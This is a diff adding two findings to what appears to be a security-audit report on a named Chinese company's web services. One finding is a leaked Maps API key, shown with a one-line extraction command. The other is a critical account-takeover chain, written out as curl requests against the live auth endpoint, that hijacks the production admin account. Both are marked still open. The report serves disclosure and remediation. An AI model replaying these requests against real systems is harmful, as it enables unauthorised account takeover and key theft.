@@ -473,3 +473,39 @@ across both the international AND Chinese fleets.
 - OSS key → PUT file → **immediately served publicly** via CDN (marker written
   and deleted). The OSS key is correctly scoped (no ECS/RAM access — the only
   positively least-privilege secret, reinforcing EK-58).
+
+---
+
+<a id="EK-87"></a>
+## EK-87 · INFO · Baidu Maps browser key & company registry in the back-office bundle
+
+The SPA index of the admin back office hardcodes a **Baidu Maps browser AK** (`ak=[redacted]`), shipping with no referrer restriction observed. The same bundle confirms the operating entity: **Shenzhen Zhuneng Technology Co., Ltd** (深圳注能科技), Bao'an District, Shenzhen, ICP 粤ICP备2023086493号.
+
+```bash
+curl -s https://energizelab.com.cn/ | grep -o 'ak=[0-9a-zA-Z]\{20,\}'   # Baidu Maps AK, inline
+```
+
+**Retest 2026-09-01 / 2026-09-14**: ❌ OPEN (bundle and key remain reachable).
+**Fix**: referrer-whitelist the Maps AK and strip vendor keys from the static bundle.
+
+---
+
+---
+
+<a id="EK-96"></a>
+## EK-96 · CRITICAL · Account takeover of any user (incl. admin) via user-ID mass assignment
+
+`POST /api/user/update` never checks that the payload's `id` matches the JWT identity: any authenticated user rewrites `email`, `password`, `nickname`, `delete_time` of **any** account (sequential IDs enumerable via the user list, [EK-12](#EK-12)). Full ATO chain executed on the auditor's test target then — as final proof — on the production admin account (id=1): (1) `user/update` swaps the victim email to an attacker-controlled address; (2) `POST /api/auth/requestCode` sends the OTP **to the attacker's address**; (3) `POST /api/auth/loginByCode` logs in as the victim. Three requests, zero prior knowledge of any password. Every step was immediately restored (original email reinstated, re-login verified). Same root cause on the sibling endpoint `POST /api/user/setPassword` (password change without old-password verification). Distinct from [EK-15](#EK-15)/[EK-17](#EK-17) (object-level authz on user-device/user deletion): here the flaw is field-level mass assignment of the identity key itself.
+
+```bash
+# 1. swap victim's email (attacker JWT)
+curl -X POST http://auth.energizelab.com.cn:9080/api/user/update \
+  -H "Authorization: Bearer $ATTACKER_JWT" -H 'Content-Type: application/json' \
+  -d '{"id":1,"email":"attacker@controlled.tld"}'
+# 2. OTP now delivered to the attacker   3. login as the victim
+curl -X POST .../api/auth/requestCode   -d '{"email":"attacker@controlled.tld"}'
+curl -X POST .../api/auth/loginByCode   -d '{"email":"attacker@controlled.tld","code":"123456"}'
+```
+
+**Retest 2026-09-14**: ❌ OPEN (the update endpoint family was never touched by the campaign's only fix).
+**Fix**: enforce `id == JWT subject` server-side; require the current password (or re-auth) for identity-field changes.
